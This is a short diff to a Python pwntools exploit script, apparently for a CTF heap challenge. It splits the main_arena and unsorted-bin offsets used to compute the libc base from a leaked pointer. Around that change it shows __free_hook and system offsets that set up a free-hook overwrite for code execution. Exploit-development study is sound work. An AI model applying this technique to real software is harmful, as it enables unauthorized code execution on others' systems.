@@ -99,7 +99,8 @@ def send(io, data):
     io.recvline()
     io.sendline(data)
 
-main_arena_offset = 0x1ebb80+0x60
+main_arena_offset = 0x1ebb80
+unsorted_bin_offset = 0x60
 __free_hook_offset = 0x1eeb28
 system_offset = 0x55410
 
@@ -112,7 +113,7 @@ send(io, b'2 0') # print first chunk
 
 io.recvline()
 libc_leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
-libc_base = libc_leak - main_arena_offset
+libc_base = libc_leak - main_arena_offset - unsorted_bin_offset
 
 __free_hook = libc_base + __free_hook_offset
 system = libc_base + system_offset
